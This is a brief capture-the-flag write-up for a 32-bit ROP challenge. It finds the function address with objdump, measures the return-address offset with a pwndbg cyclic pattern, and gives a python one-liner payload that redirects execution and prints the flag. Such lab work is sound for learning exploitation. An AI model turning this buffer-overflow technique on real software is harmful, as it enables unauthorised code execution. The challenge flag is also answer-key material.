Rop to the Top
binary, 130

Rop, rop, rop
Rop to the top!
Slip and slide and ride that rhythm...

Here's some binary and source. Navigate to /problems/roptothetop/ on the shell server to try your exploit out!


HINT:
look up "Return Oriented Programming" (ROP) vulnerabilities and figure out how you might be able to change the return address.



user@4005fe92be0b /data/binary/rop_to_the_top $ objdump -t ./rop_to_the_top32 |
grep top
./rop_to_the_top32:     file format elf32-i386
00000000 l    df *ABS*  00000000              rop_to_the_top.c
080484db g     F .text  00000019              the_top

pwndbg> set args `cyclic 200`
pwndbg> run
Starting program: /data/binary/rop_to_the_top/rop_to_the_top32 `cyclic 200`
Now copying input...
Done!

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────
*EAX  0x6
*EBX  0xffd3a670 ◂— 0x62616164 ('daab')
*ECX  0x8bc4160 ◂— 0x656e6f44 ('Done')
*EDX  0xf775e890 ◂— 0x0
 EDI  0x0
*ESI  0xf775d000 ◂— 0x1d4d6c
*EBP  0x6161616b ('kaaa')
*ESP  0xffd3a630 ◂— 0x6161616d ('maaa')
*EIP  0x6161616c ('laaa')
─────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────
Invalid address 0x6161616c










──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ esp  0xffd3a630 ◂— 0x6161616d ('maaa')
01:0004│      0xffd3a634 ◂— 0x6161616e ('naaa')
02:0008│      0xffd3a638 ◂— 0x6161616f ('oaaa')
03:000c│      0xffd3a63c ◂— 0x61616170 ('paaa')
04:0010│      0xffd3a640 ◂— 0x61616171 ('qaaa')
05:0014│      0xffd3a644 ◂— 0x61616172 ('raaa')
06:0018│      0xffd3a648 ◂— 0x61616173 ('saaa')
07:001c│      0xffd3a64c ◂— 0x61616174 ('taaa')
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► f 0 6161616c
   f 1 6161616d
   f 2 6161616e
   f 3 6161616f
   f 4 61616170
   f 5 61616171
   f 6 61616172
   f 7 61616173
   f 8 61616174
   f 9 61616175
   f 10 61616176
Program received signal SIGSEGV (fault address 0x6161616c)
pwndbg> cyclic -l kaaa
40

team332540@shell:/problems/roptothetop$ ./rop_to_the_top32 `python2.7 -c 'print "A"*44 + "\xdb\x84\x04\x08"'`
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
